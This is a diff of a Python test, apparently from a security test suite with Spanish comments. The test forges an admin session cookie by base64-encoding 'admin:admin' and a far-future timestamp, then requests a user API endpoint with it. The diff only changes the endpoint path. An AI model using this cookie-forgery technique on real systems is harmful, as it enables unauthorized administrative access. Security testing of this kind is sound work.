@@ -14,7 +14,7 @@ def test_attack_3():
     # Forjar cookie de administración: admin:admin:timestamp
     forged_token = base64.b64encode(b"admin:admin:9999999999").decode('utf-8')
     cookies = {"session_token": forged_token}
-    url = f"{BASE_URL}/api/user"
+    url = f"{BASE_URL}/api/users/me"
     try:
         response = requests.get(url, cookies=cookies, timeout=5)
         print(f"[*] GET {url} con Cookie forjada - Status Code: {response.status_code}")
